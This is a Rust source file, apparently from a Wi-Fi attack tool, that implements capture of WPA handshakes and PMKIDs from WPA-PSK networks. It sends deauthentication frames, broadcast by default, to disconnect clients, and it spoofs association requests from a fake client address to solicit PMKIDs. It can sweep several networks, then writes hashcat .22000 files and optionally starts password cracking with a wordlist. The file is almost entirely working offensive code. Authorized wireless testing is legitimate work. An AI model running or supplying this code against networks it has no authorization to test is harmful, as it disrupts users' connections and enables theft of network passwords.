//! wifi handshake: capture a WPA 4-way / PMKID, writing a radiotap pcap +
//! hashcat .22000.

use std::io::Write;
use std::sync::atomic::Ordering;
use std::time::{Duration, Instant};

use anyhow::Result;
use infishark::{Device, Handshake, MonitorFilter, ieee80211};

use crate::crack;
use crate::signals::{RUNNING, install_sigint};
use crate::target;
use crate::ui;

pub struct HandshakeOpts {
    pub ssid: Option<String>,
    pub bssid: Option<String>,
    pub channel: Option<u8>,
    pub client: Option<String>,
    pub reason: u16,
    pub pmkid_only: bool,
    pub no_pmkid: bool,
    pub passive: bool,
    pub continuous: bool,
    pub deauth_count: u32,
    pub deauth_interval_ms: u64,
    pub solicit_count: u32,
    pub solicit_interval_ms: u64,
    pub timeout_s: u64,
    pub grace_s: u64,
    pub out: Option<String>,
    pub pcap_only: bool,
    pub crack: bool,
    pub wordlist: Option<String>,
}

const SUPPRESS_PROGRESS: Duration = Duration::from_secs(6);
const SUPPRESS_MSGS: usize = 3;
const WEAK_RSSI: i8 = -80;
// Locally-administered fake client MAC for clientless PMKID solicitation.
const FAKE_CLIENT: [u8; 6] = [0x02, 0x1a, 0x2b, 0x3c, 0x4d, 0x5e];
const M_NAMES: [&str; 4] = ["M1", "M2", "M3", "M4"];

pub fn run(dev: &mut Device, opts: &HandshakeOpts, oui_db: Option<&str>) -> Result<()> {
    let client_override = match &opts.client {
        Some(c) => Some(ieee80211::parse_mac(c)?),
        None => None,
    };
    let targets = target::resolve_targets(
        dev,
        opts.ssid.as_deref(),
        opts.bssid.as_deref(),
        opts.channel,
        oui_db,
        is_psk,
    )?;
    if targets.is_empty() {
        anyhow::bail!("no matching networks");
    }
    install_sigint();
    let total = targets.len();
    let mut got = 0usize;
    for (i, t) in targets.iter().enumerate() {
        if !RUNNING.load(Ordering::SeqCst) {
            break;
        }
        if capture_one(dev, opts, t, client_override, i + 1, total)? {
            got += 1;
        }
    }
    if total > 1 {
        println!("swept {total} target(s): {got} captured");
    }
    Ok(())
}

fn capture_one(
    dev: &mut Device,
    opts: &HandshakeOpts,
    target: &target::Target,
    client_override: Option<[u8; 6]>,
    index: usize,
    total: usize,
) -> Result<bool> {
    let (bssid, channel) = (target.bssid, target.channel);
    let rsn_ie = match target.rsn {
        Some((group, pairwise)) => ieee80211::Ie::rsn_psk(group, pairwise),
        None => ieee80211::Ie::rsn_ccmp_psk(),
    };
    let stop_on_crackable = total > 1 || !opts.continuous;

    let mut hs = Handshake::new(bssid, &target.ssid, channel);
    dev.wifi_monitor_start(channel, &MonitorFilter::eapol(), None)?;
    dev.set_read_timeout(Duration::from_millis(300))?;

    let mut status = ui::StatusBlock::new();
    let start = Instant::now();
    let (mut last_draw, mut last_progress) = (start, start);
    let (mut next_solicit, mut solicits) = (start, 0u32);
    let mut next_deauth = start + Duration::from_millis(opts.deauth_interval_ms);
    let mut deauths = 0u64;

    let outcome: Result<()> = (|| {
        loop {
            if !RUNNING.load(Ordering::SeqCst) {
                return Ok(());
            }
            // Time out only when past the deadline AND EAPOL has gone quiet, so
            // a handshake in progress isn't abandoned mid-capture.
            if opts.timeout_s > 0
                && start.elapsed().as_secs() >= opts.timeout_s
                && last_progress.elapsed().as_secs() >= opts.grace_s
            {
                return Ok(());
            }
            if hs.crackable() && stop_on_crackable {
                return Ok(());
            }
            if let Some(p) = dev.next_wifi_frame_opt()? {
                if p.len() >= 6 && hs.add_frame(p[0] as i8, p[1], &p[6..]) {
                    last_progress = Instant::now();
                }
            }
            if !opts.passive {
                let now = Instant::now();
                if !opts.no_pmkid
                    && hs.pmkid.is_none()
                    && solicits < opts.solicit_count
                    && now >= next_solicit
                {
                    dev.wifi_raw_tx(
                        &ieee80211::auth_open(bssid, FAKE_CLIENT).to_bytes(),
                        channel,
                    )?;
                    let ar = ieee80211::assoc_req(
                        bssid,
                        FAKE_CLIENT,
                        &target.ssid,
                        vec![rsn_ie.clone()],
                    );
                    dev.wifi_raw_tx(&ar.to_bytes(), channel)?;
                    solicits += 1;
                    next_solicit = now + Duration::from_millis(opts.solicit_interval_ms);
                }
                if !opts.pmkid_only && now >= next_deauth {
                    // Don't kick a client mid-4-way or once nearly done.
                    let msgs = hs.msgs.iter().filter(|m| m.is_some()).count();
                    if msgs < SUPPRESS_MSGS && last_progress.elapsed() >= SUPPRESS_PROGRESS {
                        let sta = client_override
                            .or(hs.station)
                            .unwrap_or(ieee80211::BROADCAST);
                        let frame = ieee80211::deauth(bssid, sta, opts.reason).to_bytes();
                        for _ in 0..opts.deauth_count {
                            dev.wifi_raw_tx(&frame, channel)?;
                            deauths += 1;
                        }
                    }
                    next_deauth = now + Duration::from_millis(opts.deauth_interval_ms.max(1));
                }
            }
            if last_draw.elapsed() >= Duration::from_millis(200) {
                let title = format!("handshake [{index}/{total}]");
                status.draw(&status_lines(
                    &hs,
                    &title,
                    &target.label,
                    channel,
                    solicits,
                    deauths,
                    start.elapsed(),
                ));
                last_draw = Instant::now();
            }
        }
    })();

    status.clear();
    dev.stop_current_task().ok();
    outcome?;
    write_output(
        &hs,
        &target.label,
        channel,
        out_base(opts, target, total),
        opts,
    )?;
    Ok(hs.crackable())
}

fn out_base(opts: &HandshakeOpts, target: &target::Target, total: usize) -> String {
    if total == 1 {
        return opts
            .out
            .clone()
            .unwrap_or_else(|| format!("hs_{}", sanitize(&target.label)));
    }
    // Dup SSIDs share a label, so disambiguate a sweep by BSSID.
    let base = opts.out.as_deref().unwrap_or("hs");
    format!(
        "{base}_{}_{}",
        sanitize(&target.label),
        infishark::hex::encode_lower(&target.bssid)
    )
}

fn write_output(
    hs: &Handshake,
    label: &str,
    channel: u8,
    out_base: String,
    opts: &HandshakeOpts,
) -> Result<()> {
    if !hs.msgs.iter().any(|m| m.is_some()) {
        println!("nothing captured: {label} (ch {channel})");
        return Ok(());
    }
    let pcap_path = format!("{out_base}.pcap");
    let mut f = std::io::BufWriter::new(std::fs::File::create(&pcap_path)?);
    hs.to_pcap(&mut f)?;
    f.flush()?;
    println!(
        "{}: {label} (ch {channel})  ->  {pcap_path}",
        if hs.crackable() {
            "captured"
        } else {
            "partial"
        }
    );
    if !opts.pcap_only {
        let lines = hs.to_hc22000();
        if lines.is_empty() {
            println!("  partial handshake; .22000 not written");
        } else {
            let hc = format!("{out_base}.22000");
            std::fs::write(&hc, format!("{}\n", lines.join("\n")))?;
            println!("  wrote {hc} ({} line(s))", lines.len());
            if opts.crack {
                crack::run(&hc, opts.wordlist.as_deref());
            }
        }
    } else if opts.crack {
        println!("  --crack needs the .22000 (drop --pcap-only)");
    }
    Ok(())
}

// Only PSK nets have an offline-crackable 4-way; open/WEP/enterprise and
// SAE-only (pure WPA3) do not.
fn is_psk(n: &infishark::Network) -> bool {
    let e = &n.encryption;
    e.ends_with("_PSK") && e != "WPA3_PSK"
}

fn status_lines(
    hs: &Handshake,
    title: &str,
    label: &str,
    channel: u8,
    solicits: u32,
    deauths: u64,
    elapsed: Duration,
) -> Vec<String> {
    let marks: Vec<&str> = (0..4)
        .map(|i| {
            if hs.msgs[i].is_some() {
                M_NAMES[i]
            } else {
                "--"
            }
        })
        .collect();
    let rssi = if hs.ap_rssi == 0 {
        "?".to_string()
    } else {
        hs.ap_rssi.to_string()
    };
    let body = [
        format!("target   {label}  ch {channel}  rssi {rssi}"),
        format!(
            "eapol    [{}]  pmkid {}",
            marks.join(" "),
            if hs.pmkid.is_some() { "yes" } else { "no" }
        ),
        format!("tx       {solicits} solicit   {deauths} deauth"),
    ];
    let warning = (hs.ap_rssi != 0 && hs.ap_rssi < WEAK_RSSI)
        .then(|| format!("weak signal ({} dBm) - move closer", hs.ap_rssi));
    ui::status_frame(title, elapsed, &body, warning.as_deref())
}

fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect()
}
